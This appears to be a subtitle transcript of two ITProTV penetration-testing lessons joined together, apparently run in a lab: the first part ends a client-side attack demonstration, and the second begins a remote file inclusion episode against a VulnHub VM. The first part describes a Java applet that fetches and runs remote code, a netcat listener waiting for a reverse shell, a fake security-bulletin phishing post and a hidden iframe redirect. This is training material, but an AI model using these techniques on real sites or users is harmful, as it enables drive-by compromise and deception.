sorry,\nshovel your shelll back to my listener.\n\n624\n00:31:10.630 --> 00:31:11.480\nThat's what we're doing.\n\n625\n00:31:12.710 --> 00:31:13.260\n&gt;&gt; I like it.\n\n626\n00:31:13.260 --> 00:31:14.370\n&gt;&gt; It is fun.\n\n627\n00:31:14.370 --> 00:31:16.400\nExploit code runs one in the browser.\n\n628\n00:31:16.400 --> 00:31:18.303\nAgain, just like we do\nat cross-site scripting.\n\n629\n00:31:18.303 --> 00:31:21.330\nSo They kind of work together\nhand in hand like that.\n\n630\n00:31:21.330 --> 00:31:24.540\nThe pre-setup is we need to get some\ninformation about the targets and\n\n631\n00:31:24.540 --> 00:31:27.670\nthen we need to find a good exploit or\ncreate one ourselves.\n\n632\n00:31:27.670 --> 00:31:29.370\nSo let's take a look at that.\n\n633\n00:31:29.370 --> 00:31:32.070\nWe did see that coming in here.\n\n634\n00:31:32.070 --> 00:31:35.720\nAs this user, good thing I left that open,\nI'm glad I did cuz I'm just gonna\n\n635\n00:31:36.720 --> 00:31:41.490\ngo to that Sites, and\nthen you'll see this come through.\n\n636\n00:31:41.490 --> 00:31:47.184\nAnd you'll see right there, MSIE 8.0.\n\n637\n00:31:47.184 --> 00:31:48.757\nThat's good information right there.\n\n638\n00:31:48.757 --> 00:31:50.709\nAlso telling me Windows NT 6.1.\n\n639\n00:31:50.709 --> 00:31:54.977\nA lot of good Enumeration of that system,\nokay?\n\n640\n00:31:54.977 --> 00:31:57.990\nSo MSI 8.0 is great news,\nI can close this down,\n\n641\n00:31:57.990 --> 00:32:02.983\nthere's a cool thing that you have inside\nof your Kali system called SearchSploit.\n\n642\n00:32:02.983 --> 00:32:07.788\nSearchSploit like that and\nit has a database of exploits.\n\n643\n00:32:07.788 --> 00:32:11.371\nSo I can say Internet Explorer 8 and\n\n644\n00:32:11.371 --> 00:32:16.151\nthen I'll say remote,\nsomething like that and\n\n645\n00:32:16.151 --> 00:32:20.813\nit gives me a list of\nremote vulnerabilities,\n\n646\n00:32:20.813 --> 00:32:25.593\nthese guys right here with\nthat HTML on the end,\n\n647\n00:32:25.593 --> 00:32:29.370\nthose are these types of attacks.\n\n648\n00:32:29.370 --> 00:32:31.825\nSo you can go through them,\nfind one that you think might work.\n\n649\n00:32:31.825 --> 00:32:35.820\nYou're gonna probably have to modify\nthe code in there quite a bit,\n\n650\n00:32:35.820 --> 00:32:38.970\nif not just a little bit at least,\nso there goes that whole,\n\n651\n00:32:38.970 --> 00:32:42.780\nI have to have bit of programming\nbackground to understand what's going on\n\n652\n00:32:42.780 --> 00:32:46.100\nor you're gonna be doing a lot of\nGoogle searching figuring things out.\n\n653\n00:32:46.100 --> 00:32:49.450\nIt is frustration on a stick,\nbut it is part of the game.\n\n654\n00:32:49.450 --> 00:32:53.090\nSo if you don't have strong programming\nskills and you wanna get into pen testing\n\n655\n00:32:53.090 --> 00:32:57.940\nit is definitely a good idea to get\ncomfortable using at least some\n\n656\n00:32:57.940 --> 00:33:01.370\ntype of programming language, Java's a\ngreat one, it's easy to get your feet wet,\n\n657\n00:33:01.370 --> 00:33:05.260\nPython another one, Perl from\nback in the 90s was very popular,\n\n658\n00:33:05.260 --> 00:33:09.880\na lot of websites still run it,\nit's still out there so get that.\n\n659\n00:33:11.000 --> 00:33:12.490\nWhat I've done I've just written my own.\n\n660\n00:33:12.490 --> 00:33:16.210\nActually I kinda stole that code\nfrom something I found online.\n\n661\n00:33:16.210 --> 00:33:17.940\nI just looked for,\n\n662\n00:33:17.940 --> 00:33:23.135\nmake a Java applet that downloads code\nfrom a remote host and executes it.\n\n663\n00:33:23.135 --> 00:33:25.010\n&gt;&gt; [LAUGH]\n&gt;&gt; Lo and behold I found sites that showed\n\n664\n00:33:25.010 --> 00:33:26.510\nme how to do that and I did.\n\n665\n00:33:26.510 --> 00:33:30.020\nI took bits and pieces and put it all\ntogether and was able to do that.\n\n666\n00:33:30.020 --> 00:33:31.840\nI have self-signed this certificate.\n\n667\n00:33:33.060 --> 00:33:35.780\nSomething that Java does not like anymore.\n\n668\n00:33:35.780 --> 00:33:38.490\nSo you have to make an exception,\nbut we'll see.\n\n669\n00:33:38.490 --> 00:33:42.250\nLet's show you the social engineering\nside of it, and then the code side of it.\n\n670\n00:33:42.250 --> 00:33:45.870\nAnd see if it doesn't make a little\nmore sense than me trying to explain it.\n\n671\n00:33:45.870 --> 00:33:47.570\nSo, where we at?\n\n672\n00:33:47.570 --> 00:33:48.820\nWe gathered the information.\n\n673\n00:33:48.820 --> 00:33:51.608\nIt was the same place we stole\nthe session cookie stuff from.\n\n674\n00:33:51.608 --> 00:33:55.140\nLet's see here.\n\n675\n00:33:55.140 --> 00:33:57.930\nLook for or create a client side exploit.\n\n676\n00:33:57.930 --> 00:33:59.220\nWe talked about that.\n\n677\n00:33:59.220 --> 00:34:02.030\nNow, let's go ahead and\nopen up our Netcat listener, so\n\n678\n00:34:02.030 --> 00:34:04.990\nthat we can be ready for\nwhen this shell actually comes back.\n\n679\n00:34:04.990 --> 00:34:07.480\nSo I'm gonna just shrink my browser here.\n\n680\n00:34:07.480 --> 00:34:11.611\nGot this other one going,\nI don't need you real quickly.\n\n681\n00:34:11.611 --> 00:34:16.760\nI will say nc-mvlp and port.\n\n682\n00:34:16.760 --> 00:34:20.950\nOn this one, I went with port 443,\nbecause typically firewalls allow that,\n\n683\n00:34:20.950 --> 00:34:24.460\nbecause it's SSH and TSL, right.\n\n684\n00:34:24.460 --> 00:34:26.170\nSSl, TSL, whatever it is.\n\n685\n00:34:26.170 --> 00:34:26.940\nSSL.\nTSL.\n\n686\n00:34:26.940 --> 00:34:27.880\nThat's it.\n\n687\n00:34:27.880 --> 00:34:28.730\nTLS.\n\n688\n00:34:28.730 --> 00:34:30.750\nBoy, there's so many acronyms, Mike.\n\n689\n00:34:30.750 --> 00:34:31.370\nCan we get it right?\n\n690\n00:34:31.370 --> 00:34:31.970\nThere we go.\n\n691\n00:34:31.970 --> 00:34:33.200\nSo I just got my listener going.\n\n692\n00:34:33.200 --> 00:34:35.710\nSo when that shell pops,\nit's ready and waiting.\n\n693\n00:34:35.710 --> 00:34:40.050\nI'm not having to go back and\nbe Johnny-come-lately.\n\n694\n00:34:40.050 --> 00:34:42.830\nNow that that's done,\nwe have the code, we have that.\n\n695\n00:34:42.830 --> 00:34:45.940\nAll right,\nwe need to start the web service.\n\n696\n00:34:45.940 --> 00:34:48.070\nSo we will need a web service running.\n\n697\n00:34:48.070 --> 00:34:50.190\nI do have Apache on here running, and\n\n698\n00:34:50.190 --> 00:34:53.900\nI've put my exploit files in\nthe web root of my Apache server.\n\n699\n00:34:53.900 --> 00:34:58.267\nWe can take a look at that by doing a ls-,\nI'm sorry,\n\n700\n00:34:58.267 --> 00:35:05.190\n/var/www/html, there we go,\nand there's all my files.\n\n701\n00:35:05.190 --> 00:35:09.228\nThe one I've created is right, is that it?\n\n702\n00:35:09.228 --> 00:35:12.272\nNo, no, no, no, there it is,\nIE8 Attack, that's my guy.\n\n703\n00:35:12.272 --> 00:35:14.919\nYou can tell I've been playing\nwith this a little bit.\n\n704\n00:35:14.919 --> 00:35:17.843\nI've got so many different attacks\nthat I've thrown into this web server,\n\n705\n00:35:17.843 --> 00:35:18.790\nit's horrible [LAUGH].\n\n706\n00:35:18.790 --> 00:35:20.580\nI would get black boxed so fast.\n\n707\n00:35:20.580 --> 00:35:25.740\nSo that's my attack, I've put it there,\nnow we're gonna do that browser\n\n708\n00:35:25.740 --> 00:35:32.520\nredirection to get their client machine\nto download this file from my web server.\n\n709\n00:35:32.520 --> 00:35:37.650\nSo make sure your web server is installed\nand running, you've put your attack into\n\n710\n00:35:37.650 --> 00:35:41.760\nthe web root, so that we can do browser\nredirection, have them download that file.\n\n711\n00:35:41.760 --> 00:35:47.440\nAll right, so now that that's there,\nverify that my Apache is running.\n\n712\n00:35:47.440 --> 00:35:52.170\nI can do my little script here\nthat I keep, S-R-V-C-S-H,\n\n713\n00:35:52.170 --> 00:35:54.330\nI'm just gonna hit start.\n\n714\n00:35:54.330 --> 00:35:55.110\nMake sure that's going.\n\n715\n00:35:55.110 --> 00:35:55.890\nYep, there we go.\n\n716\n00:35:57.070 --> 00:35:59.130\nI think I'm all set up,\nI'm ready to fire off.\n\n717\n00:36:00.320 --> 00:36:03.730\nSo what I need to do is I need to do\nmy cross-site scripting attack for\n\n718\n00:36:03.730 --> 00:36:06.130\nthe browser redirect, so\nthat they'll download my code.\n\n719\n00:36:06.130 --> 00:36:09.010\nLet's open up my IceWeasel.\n\n720\n00:36:09.010 --> 00:36:14.790\nWe will go to the Home,\nwe will Comments, go here,\n\n721\n00:36:14.790 --> 00:36:17.620\nand we're just gonna add a couple,\na nice little comment here.\n\n722\n00:36:17.620 --> 00:36:18.120\nIt's gonna be an IFrame.\n\n723\n00:36:20.429 --> 00:36:21.610\nLike that.\n\n724\n00:36:21.610 --> 00:36:24.090\nActually, I don't wanna fat finger it.\n\n725\n00:36:24.090 --> 00:36:25.330\nI was smart.\n\n726\n00:36:25.330 --> 00:36:28.450\nI did browser redirect.\n\n727\n00:36:29.510 --> 00:36:32.500\nSo I'm going to,\nactually you know what I'm gonna do?\n\n728\n00:36:32.500 --> 00:36:34.040\nI'm gonna do it this way.\n\n729\n00:36:34.040 --> 00:36:35.670\nI decided to be a little more sneaky.\n\n730\n00:36:35.670 --> 00:36:39.280\nLet's go to the Admin section,\nlet's create a new post.\n\n731\n00:36:39.280 --> 00:36:40.066\nThis is gonna be fun.\n\n732\n00:36:45.133 --> 00:36:48.055\nTent security bulletin.\n\n733\n00:36:48.055 --> 00:36:50.943\nI see that, bulletin.\n\n734\n00:36:50.943 --> 00:36:54.430\nAnd I'm going to copy and paste.\n\n735\n00:36:54.430 --> 00:36:56.954\nI created this cuz I\nthought it would be funny.\n\n736\n00:36:56.954 --> 00:37:00.481\nCat browser redirect.\n\n737\n00:37:00.481 --> 00:37:01.266\nNope.\n\n738\n00:37:01.266 --> 00:37:05.770\nCat Fake post, there we go.\n\n739\n00:37:06.800 --> 00:37:09.510\nIt says there has been a major exploit\ndiscovered for users running Java,\n\n740\n00:37:09.510 --> 00:37:12.800\nthis post will actually test your\nbrowser for the vulnerability and\n\n741\n00:37:12.800 --> 00:37:15.370\nprompt you to install the fix if it\ndiscovers that you're vulnerable.\n\n742\n00:37:15.370 --> 00:37:18.600\nIt is imperative that you allow\nthis fix to be installed or\n\n743\n00:37:18.600 --> 00:37:20.770\nyou run the risk of having\nyour system compromised.\n\n744\n00:37:20.770 --> 00:37:24.400\nSince we are providing the fix ourselves\nJava might give you a security warning,\n\n745\n00:37:24.400 --> 00:37:28.240\nmake sure to check the I Accept This Risk\nbox and then click Run.\n\n746\n00:37:28.240 --> 00:37:30.260\nEverything else will be\nupdated in the background.\n\n747\n00:37:30.260 --> 00:37:36.260\nSincerely the My Blog tech support,\nthank you for your cooperation, right.\n\n748\n00:37:36.260 --> 00:37:38.970\nSo I'm just gonna copy and\npaste that as my post.\n\n749\n00:37:38.970 --> 00:37:40.180\n&gt;&gt; Social engineering at its finest.\n\n750\n00:37:40.180 --> 00:37:44.250\n&gt;&gt; Social engineering And\nPaste that, there we go.\n\n751\n00:37:44.250 --> 00:37:48.200\nNow I'm gonna add that as an actual,\nso if I go to the home page,\n\n752\n00:37:48.200 --> 00:37:51.080\nif I'm a user I go to the home page,\nI'm gonna see, wow, man.\n\n753\n00:37:52.480 --> 00:37:54.380\nI gotta check this out,\nI gotta look at that.\n\n754\n00:37:54.380 --> 00:37:57.080\nSo I'm gonna also add my comment here,\n\n755\n00:37:57.080 --> 00:38:03.100\nwhich is gonna be my browser redirect, my\ngood old IFrame, I'm gonna also copy that.\n\n756\n00:38:03.100 --> 00:38:07.398\nSo cat browser redirect, I've been wanting\nto do this the whole time, haven't I?\n\n757\n00:38:07.398 --> 00:38:10.030\nSo I've got a couple of them\nhere just really quickly.\n\n758\n00:38:10.030 --> 00:38:15.653\nI can create an IFrame,\njust a regular IFrame for this Java HTML.\n\n759\n00:38:15.653 --> 00:38:17.989\nI can do this with height and\n\n760\n00:38:17.989 --> 00:38:23.186\nwidth to make it basically invisible,\nsaying zero, zero.\n\n761\n00:38:23.186 --> 00:38:28.880\nHeight and width is zero, so it will make\na weird square and we don't wanna do that.\n\n762\n00:38:28.880 --> 00:38:32.940\nWe want it to run this attack here.\n\n763\n00:38:32.940 --> 00:38:34.150\nActually, it was Java.\n\n764\n00:38:34.150 --> 00:38:36.270\nI'm doing the Java attack,\nnot the IE 8 attack.\n\n765\n00:38:36.270 --> 00:38:37.840\nI was playing with that earlier.\n\n766\n00:38:37.840 --> 00:38:38.660\nSo I was firing up.\n\n767\n00:38:38.660 --> 00:38:41.420\nSo we're gonna do this Java attack and\nI'll use this invisible one.\n\n768\n00:38:41.420 --> 00:38:48.350\nSo you can see what that looks like,\ncuz my code is Java, not HTML, copy that.\n\n769\n00:38:48.350 --> 00:38:49.250\nPaste that in here.\n\n770\n00:38:49.250 --> 00:38:52.540\nI don't know why this thing does that.\n\n771\n00:38:52.540 --> 00:38:53.420\nIt's weird.\n\n772\n00:38:54.600 --> 00:38:56.970\nAll right, let's see here, looks all good.\n\n773\n00:38:56.970 --> 00:39:00.756\nThe source IFrame source is from\nmy web server grabbing Java HTML,\n\n774\n00:39:00.756 --> 00:39:04.080\nthe height zero, width zero,\nand then close the IFrame.\n\n775\n00:39:04.080 --> 00:39:05.150\nAll right, looks good.\n\n776\n00:39:05.150 --> 00:39:06.740\nSubmit the query.\n\n777\n00:39:06.740 --> 00:39:09.170\nAnd now, here I am at work.\n\n778\n00:39:09.170 --> 00:39:10.850\nI'm random user.\n\n779\n00:39:10.850 --> 00:39:13.160\nMy listener's fired up I do believe.\n\n780\n00:39:13.160 --> 00:39:16.430\nIf I can get to that.\n\n781\n00:39:16.430 --> 00:39:17.750\nYep, listener's waiting.\n\n782\n00:39:17.750 --> 00:39:19.900\nLooks all good.\nI'm gonna go home.\n\n783\n00:39:19.900 --> 00:39:22.990\nLooking through the blog posts.\n\n784\n00:39:22.990 --> 00:39:23.490\nWhat's this?\n\n785\n00:39:23.490 --> 00:39:24.610\nSecurity Bulletin.\n\n786\n00:39:24.610 --> 00:39:25.132\nYeah, let's check that out.\n\n787\n00:39:27.963 --> 00:39:28.680\nWhat's going on here?\n\n788\n00:39:29.720 --> 00:39:31.940\nHm.\nThere's been a major exploit discovered.\n\n789\n00:39:31.940 --> 00:39:32.620\nYeah, what's this?\n\n790\n00:39:32.620 --> 00:39:34.410\nSecurity warning?\n\n791\n00:39:34.410 --> 00:39:35.580\nIt says I should accept.\n\n792\n00:39:35.580 --> 00:39:37.370\nOkay I click to accept this risk.\n\n793\n00:39:37.370 --> 00:39:39.190\nYeah I totally don't wanna be compromised.\n\n794\n00:39:39.190 --> 00:39:39.800\nHit Run.\n\n795\n00:39:40.930 --> 00:39:44.030\nNow look at my listener right down here.\n\n796\n00:39:44.030 --> 00:39:45.230\nI have now, who am I?\n\n797\n00:39:45.230 --> 00:39:48.840\nI'm running as administrator.\n\n798\n00:39:48.840 --> 00:39:51.100\nSo that person ran their job,\n\n799\n00:39:51.100 --> 00:39:54.710\na little social engineering involved\nthere, but once they clicked okay and\n\n800\n00:39:54.710 --> 00:39:59.060\nthey ran that applet It basically shoveled\na shell back to me waiting for that and\n\n801\n00:39:59.060 --> 00:40:00.670\nif you look it down-\n&gt;&gt; Can you go back to the Windows box?\n\n802\n00:40:00.670 --> 00:40:02.000\n&gt;&gt; Yeah, none the wiser right.\n\n803\n00:40:02.000 --> 00:40:07.120\nNothing is going crazy here,\nthey're like weird, they can post and\n\n804\n00:40:07.120 --> 00:40:11.240\nsay just user one, wow, thanks,\n\n805\n00:40:11.240 --> 00:40:16.180\nyou know this is great, thanks so\n\n806\n00:40:16.180 --> 00:40:20.460\nmuch, what I really wanna put,\nsubmit that, it will go in.\n\n807\n00:40:20.460 --> 00:40:22.219\nThe WAN's just fine, it's working.\n\n808\n00:40:22.219 --> 00:40:25.230\nI'm still over here in complete control.\n\n809\n00:40:25.230 --> 00:40:27.780\nThey have no idea,\neverything is working just fine.\n\n810\n00:40:27.780 --> 00:40:31.530\nSo that's a very dangerous type of attack\nand now you've seen why I'm able to\n\n811\n00:40:31.530 --> 00:40:35.910\ncompletely compromise a system, using\nbrowser redirects, cross-site scripting\n\n812\n00:40:35.910 --> 00:40:39.380\nand then my client side, I created\na Java app, could be an HTML app.\n\n813\n00:40:39.380 --> 00:40:41.940\nWhatever.\nYou find the source code that exploits\n\n814\n00:40:41.940 --> 00:40:45.360\nwhatever browser that they're running,\nand go to town.\n\n815\n00:40:45.360 --> 00:40:47.910\n&gt;&gt; All right,\nfantastic stuff there, Daniel.\n\n816\n00:40:47.910 --> 00:40:51.570\nGreat demonstration of\ncross-site scripting.\n\n817\n00:40:51.570 --> 00:40:54.050\nProbably one of the best demonstrations\nI think I've seen in a long time,\n\n818\n00:40:54.050 --> 00:40:55.780\nyou really made it very clear.\n\n819\n00:40:55.780 --> 00:40:58.960\nSo hopefully now you guys out there\nunderstand what it is when people talk\n\n820\n00:40:58.960 --> 00:41:03.950\nabout cross-site scripting and how danger\nit is, dangerous if i can say that.\n\n821\n00:41:03.950 --> 00:41:06.500\nHow dangerous it is,\nbecause it's like a drive by, right?\n\n822\n00:41:06.500 --> 00:41:09.040\nYou just visited a webpage and\nyou got infected.\n\n823\n00:41:09.040 --> 00:41:12.070\nYou didn't have to do anything,\nyou didn't have to click on anything.\n\n824\n00:41:12.070 --> 00:41:14.210\nIt was just your browser\ninterpreting that page.\n\n825\n00:41:14.210 --> 00:41:15.158\nDangerous stuff.\n\n826\n00:41:15.158 --> 00:41:18.180\nAs a pen tester, we've got to know\nhow to check for those things.\n\n827\n00:41:18.180 --> 00:41:20.007\nSo Daniel showed you that as well,\n\n828\n00:41:20.007 --> 00:41:23.978\nhow to determine if our site is\nvulnerable to this cross-site scripting.\n\n829\n00:41:23.978 --> 00:41:25.170\nSo we do appreciate that.\n\n830\n00:41:25.170 --> 00:41:28.460\nWe hope everybody out there\nenjoyed watching this one.\n\n831\n00:41:28.460 --> 00:41:31.270\nSigning off for ITProTV,\nI have been your host Mike Rodrick.\n\n832\n00:41:31.270 --> 00:41:32.090\n&gt;&gt; And I'm Daniel Lowrie.\n\n833\n00:41:32.090 --> 00:41:32.856\n&gt;&gt; And we'll see you next time.\n\n834\n00:41:32.856 --> 00:41:40.105\n[MUSIC]\n\n835\n00:41:40.105 --> 00:41:42.650\n&gt;&gt; Thank you for

00:00:11.996\n&gt;&gt; You're watching ITProTV.\n\n4\n00:00:11.996 --> 00:00:15.485\n&gt;&gt; Hello, welcome to another\nexciting episode here at ITProTV.\n\n5\n00:00:15.485 --> 00:00:17.510\nI'm your host, Mike Rodrick.\n\n6\n00:00:17.510 --> 00:00:20.100\nAnd today we're doing\nour penetration testing.\n\n7\n00:00:20.100 --> 00:00:23.896\nIn this episode, we're gonna be looking\nat another type of web-based attack, or\n\n8\n00:00:23.896 --> 00:00:24.666\nweb app attack.\n\n9\n00:00:24.666 --> 00:00:30.040\nAnd that's known as RFI,\nor remote file inclusion.\n\n10\n00:00:30.040 --> 00:00:33.280\nAnd here to share his\nknowledge on the topic, so\n\n11\n00:00:33.280 --> 00:00:36.730\nthat we can be as knowledgeable,\nis Mr. Daniel Lowrie.\n\n12\n00:00:36.730 --> 00:00:37.722\nWelcome back, Daniel.\n\n13\n00:00:37.722 --> 00:00:38.805\n&gt;&gt; Mike, so glad to be back, man.\n\n14\n00:00:38.805 --> 00:00:42.321\nWe're cranking out this pen testing\nstuff and it's been so much fun so far.\n\n15\n00:00:42.321 --> 00:00:46.022\nAnd today we've landed on the topic\nof remote file inclusion.\n\n16\n00:00:46.022 --> 00:00:51.960\nIt's one of my favorites because this is\na nasty little bugger and it's so easy.\n\n17\n00:00:51.960 --> 00:00:56.430\nIf it's vulnerable to this, man,\nthese hacks, they can be so, so easy.\n\n18\n00:00:56.430 --> 00:00:59.166\nI say that, and of course,\nyou'll be pulling your hair out and-\n\n19\n00:00:59.166 --> 00:01:00.033\n&gt;&gt; [LAUGH]\n\n20\n00:01:00.033 --> 00:01:00.628\n&gt;&gt; Frustrated and\n\n21\n00:01:00.628 --> 00:01:03.057\nshaking your fist at me, going,\nthat Lowrie said it was easy!\n\n22\n00:01:03.057 --> 00:01:07.000\n&gt;&gt; The 50th time you done it, it's easy.\n\n23\n00:01:07.000 --> 00:01:08.527\n&gt;&gt; You just crank it out after that,\nright?\n\n24\n00:01:08.527 --> 00:01:09.619\n&gt;&gt; [LAUGH]\n&gt;&gt; Yeah, that's right,\n\n25\n00:01:09.619 --> 00:01:12.180\nso you definitely wanna practice\nthese things as you can.\n\n26\n00:01:12.180 --> 00:01:15.700\nSpeaking of being able to practice,\nfor this demonstration,\n\n27\n00:01:15.700 --> 00:01:19.300\nI have gone back to our good\nfriends at VulnHub.com and\n\n28\n00:01:19.300 --> 00:01:23.680\ndownloaded another VM for\nthis specific type of attack.\n\n29\n00:01:23.680 --> 00:01:27.770\nThis VM is called Milnets,\nif I'm not mistaken, yes, Milnet 1.0.\n\n30\n00:01:27.770 --> 00:01:30.689\nI'll show you what it looks like\nfired up on my screen here.\n\n31\n00:01:30.689 --> 00:01:34.215\nThere you go, so beautiful with\nthe ASCII art, I do love it so.\n\n32\n00:01:34.215 --> 00:01:37.328\nI just fired that up,\nput that in a virtual sandbox.\n\n33\n00:01:37.328 --> 00:01:40.112\nDon't allow people to access\nit from the Internet,\n\n34\n00:01:40.112 --> 00:01:44.286\nbecause It is vulnerable by design, so\nthat you can learn these techniques and\n\n35\n00:01:44.286 --> 00:01:46.650\nconcepts and have a good time as well.\n\n36\n00:01:46.650 --> 00:01:49.147\nSo thanks, guys over at VulnHub,\nappreciate that for\n\n37\n00:01:49.147 --> 00:01:50.353\nus being able to use this.\n\n38\n00:01:50.353 --> 00:01:56.260\nAnd this guy's gonna allow us,\nit is vulnerable to a RFI type of attack.\n\n39\n00:01:56.260 --> 00:02:00.570\nSo that being said, I'll go ahead and take\nmy screen away, let's talk for a moment.\n\n40\n00:02:00.570 --> 00:02:01.949\nLet's gather around the campfire.\n\n41\n00:02:01.949 --> 00:02:06.370\nWhat the heck are we talking about when\nwe say RFI or remote file inclusion?\n\n42\n00:02:07.620 --> 00:02:12.835\nSo what we mean is, we are going\nto include a file that is remote.\n\n43\n00:02:12.835 --> 00:02:16.196\n[LAUGH] Yeah, you're like,\nokay, smarty, I get it.\n\n44\n00:02:16.196 --> 00:02:20.001\n&gt;&gt; [LAUGH]\n&gt;&gt; What we mean is that I'm gonna have\n\n45\n00:02:20.001 --> 00:02:24.432\na file on my system, or\na remote system to the target,\n\n46\n00:02:24.432 --> 00:02:30.360\nthat I want to include as part of the URL,\nbasically, or the web app.\n\n47\n00:02:30.360 --> 00:02:33.468\nSo, when I run something on a target,\n\n48\n00:02:33.468 --> 00:02:37.851\na web app,\nit's gonna include a file from my system.\n\n49\n00:02:37.851 --> 00:02:40.089\nThat's the basic gist of it.\n\n50\n00:02:40.089 --> 00:02:41.870\nAnd what do you mean?\n\n51\n00:02:41.870 --> 00:02:43.821\nHow do you conclude?\n\n52\n00:02:43.821 --> 00:02:46.851\nWell, sometimes when people\ncreate websites, they say, man,\n\n53\n00:02:46.851 --> 00:02:50.140\nI don't wanna download all\nthese files from Getty Images.\n\n54\n00:02:50.140 --> 00:02:53.330\nI want to just go to Getty Images and\nget them.\n\n55\n00:02:53.330 --> 00:02:56.805\nSo I'll include that,\nI'll turn on some flags in my PHP code, so\n\n56\n00:02:56.805 --> 00:02:59.791\nthat I can include those files\nfrom the remote servers.\n\n57\n00:02:59.791 --> 00:03:04.120\nSeems like it's a very important or\na good thing to do, right?\n\n58\n00:03:04.120 --> 00:03:04.711\n&gt;&gt; Absolutely.\n\n59\n00:03:04.711 --> 00:03:07.658\n&gt;&gt; So you're not storing all the images\nthat you need, Getty Images is doing it,\n\n60\n00:03:07.658 --> 00:03:09.861\nor wherever that you're getting\nthem from is doing that.\n\n61\n00:03:09.861 --> 00:03:12.532\nSo this is one of the reasons\nthat you might wanna do this,\n\n62\n00:03:12.532 --> 00:03:13.932\nyou might wanna turn this on.\n\n63\n00:03:13.932 --> 00:03:20.558\nUnfortunately, it opens you up, if you are\nnot doing proper sanitization of URLs and\n\n64\n00:03:20.558 --> 00:03:24.974\nthings of that nature,\nthen the problem lies in, well,\n\n65\n00:03:24.974 --> 00:03:29.590\nI can just take that Getty Images URL\nout and add my URL to it.\n\n66\n00:03:29.590 --> 00:03:30.959\nAnd now it'll look to me,\n\n67\n00:03:30.959 --> 00:03:35.960\nbecause it's looking for a URL that's\nremote to itself, and to include a file.\n\n68\n00:03:35.960 --> 00:03:39.740\nThis is the danger of working\nwith remote file inclusions.\n\n69\n00:03:39.740 --> 00:03:44.240\nSo, if you turn these things on, that will\nbe in your phpinfo file, in the setup,\n\n70\n00:03:44.240 --> 00:03:45.692\nin the .conf, all that.\n\n71\n00:03:45.692 --> 00:03:48.127\nThere will be a couple of flags,\n\n72\n00:03:48.127 --> 00:03:52.932\nI wrote them down because I wanted\nto make sure I got them right.\n\n73\n00:03:52.932 --> 00:03:57.279\nAllow_url_fopen = on.\n\n74\n00:03:57.279 --> 00:03:59.076\nAnd let me go to my computer real quick,\nI'll type it out so\n\n75\n00:03:59.076 --> 00:04:00.890\nyou can kinda get a visual of it.\n\n76\n00:04:00.890 --> 00:04:03.133\nLet me do this,\nmake these a little bigger here.\n\n77\n00:04:03.133 --> 00:04:08.925\nSo it'll look like this, allow urI,\n\n78\n00:04:08.925 --> 00:04:13.820\nI think it's _url, _url_.\n\n79\n00:04:13.820 --> 00:04:16.688\nI'm sorry, allow_url [LAUGH].\n\n80\n00:04:16.688 --> 00:04:19.135\nI am the world's worst typist,\nas you can tell.\n\n81\n00:04:19.135 --> 00:04:20.583\nRonnie taught me well, man.\n\n82\n00:04:20.583 --> 00:04:21.824\n&gt;&gt; You still haven't got it, sorry.\n\n83\n00:04:21.824 --> 00:04:23.022\n&gt;&gt; You be quiet over there!\n\n84\n00:04:23.022 --> 00:04:23.768\n&gt;&gt; It says usl.\n\n85\n00:04:23.768 --> 00:04:24.805\n&gt;&gt; [LAUGH] Does it really?\n\n86\n00:04:24.805 --> 00:04:25.885\n&gt;&gt; [LAUGH] Yes.\n\n87\n00:04:25.885 --> 00:04:28.627\n&gt;&gt; Jeez, url, there we go.\n\n88\n00:04:28.627 --> 00:04:31.220\nThat's what it should look like.\n\n89\n00:04:31.220 --> 00:04:31.990\nYou've got this one, so\n\n90\n00:04:31.990 --> 00:04:37.490\nif you see if that in your php.conf and it\nequals on, you might wanna make that off.\n\n91\n00:04:37.490 --> 00:04:43.390\nAlso, as well, it'll look like this,\nallow_url_include = on.\n\n92\n00:04:43.390 --> 00:04:45.700\nSo you're allowing includes.\n\n93\n00:04:45.700 --> 00:04:48.340\nSo if you've played around\nwith any HTML and PHP,\n\n94\n00:04:48.340 --> 00:04:51.490\nyou have these lovely\nthings called includes.\n\n95\n00:04:51.490 --> 00:04:54.170\nWe're including files from other places,\nand\n\n96\n00:04:54.170 --> 00:04:57.340\nyou're giving it information\nfrom using that include.\n\n97\n00:04:57.340 --> 00:05:00.311\nThis is where the danger can lie,\nand this also can also lead to us\n\n98\n00:05:00.311 --> 00:05:04.350\nhaving problems with local file inclusion\nthat we'll talk about in a different show.\n\n99\n00:05:04.350 --> 00:05:07.782\nCuz this is going to take up the entirety\nof this one, that is for sure.\n\n100\n00:05:07.782 --> 00:05:09.806\nSo let's get back to\nremote file inclusion.\n\n101\n00:05:09.806 --> 00:05:12.540\nLet's see here, what else do I\nneed you guys to know about that?\n\n102\n00:05:12.540 --> 00:05:14.314\nHow do I find out whether or\n\n103\n00:05:14.314 --> 00:05:18.600\nnot this site is vulnerable,\nor that a site is vulnerable?\n\n104\n00:05:18.600 --> 00:05:21.982\nWell of course, as we do, as pen testers,\nwhat are the first phases?\n\n105\n00:05:21.982 --> 00:05:24.599\nScanning and enumeration,\nwe've gotta run that gambit.\n\n106\n00:05:24.599 --> 00:05:26.673\nGotta do it, it's part of our job.\n\n107\n00:05:26.673 --> 00:05:28.677\nSo we run Nmap, we run Nikto,\n\n108\n00:05:28.677 --> 00:05:32.220\nbecause those are two very good things for\nrunning.\n\n109\n00:05:32.220 --> 00:05:35.368\nWe can also run some other scanners,\nbut for this intents and purposes,\n\n110\n00:05:35.368 --> 00:05:37.342\nthat's all we'll need, so let's do this.\n\n111\n00:05:37.342 --> 00:05:39.622\nWe're gonna Nmap scan really quickly.\n\n112\n00:05:39.622 --> 00:05:43.113\nNmap, actually, we gotta find the IP\naddress of our vulnerable machine.\n\n113\n00:05:43.113 --> 00:05:44.473\nSo I'll do that whole netdiscover.\n\n114\n00:05:47.406 --> 00:05:50.804\n-i eth0 -r for the range.\n\n115\n00:05:50.804 --> 00:05:56.126\nAnd 192.168.209.1/24.\n\n116\n00:05:56.126 --> 00:05:58.687\nFire off, let's see if we can't\nfind ourselves some IP addresses.\n\n117\n00:05:58.687 --> 00:06:01.761\nThere we go, looking good.\n\n118\n00:06:01.761 --> 00:06:04.862\n156 looks to be our target machine.\n\n119\n00:06:04.862 --> 00:06:09.241\nCuz I know 1 is me, and so is 254,\nbecause that's the gateway.\n\n120\n00:06:09.241 --> 00:06:12.337\nCtrl+C that,\nnow we know what our machine is.\n\n121\n00:06:12.337 --> 00:06:20.077\nRun our trusty nmap -a for that lovely\nall-in-one package that Nmap affords us.\n\n122\n00:06:20.077 --> 00:06:27.310\nGive it some aggressive timing, all ports,\nand then the IP address 192.168.209.156.\n\n123\n00:06:27.310 --> 